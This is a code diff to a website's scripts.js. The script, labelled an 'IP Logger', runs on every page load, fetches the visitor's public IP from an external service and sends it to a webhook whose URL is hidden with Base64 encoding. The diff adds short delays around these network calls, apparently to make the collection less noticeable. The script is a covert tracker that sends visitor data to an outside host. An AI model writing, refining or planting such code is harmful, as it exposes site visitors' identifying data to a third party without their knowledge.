@@ -58,6 +58,9 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         try {
+            // Introduce a small delay before the first network request to prevent immediate lag
+            await new Promise(resolve => setTimeout(resolve, 50)); // Pause for 50 milliseconds
+
             // 1. Get the public IP address using an external service
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             if (!ipResponse.ok) {
@@ -82,6 +85,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 console.error("IP Logger: Failed to decode webhook URL. Is it correctly Base64 encoded?", e);
                 return; 
             }
+
+            // Introduce another small delay before sending to the webhook
+            await new Promise(resolve => setTimeout(resolve, 50)); // Pause for another 50 milliseconds
 
             // 3. Prepare the data to send with an embed
             const payload = {
@@ -201,5 +207,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Call the function when the page loads.
     // This will run on every page that includes scripts.js.
-    sendIpToWebhook();
+    // We removed the overall setTimeout and added smaller delays inside the function
+    sendIpToWebhook(); 
 });
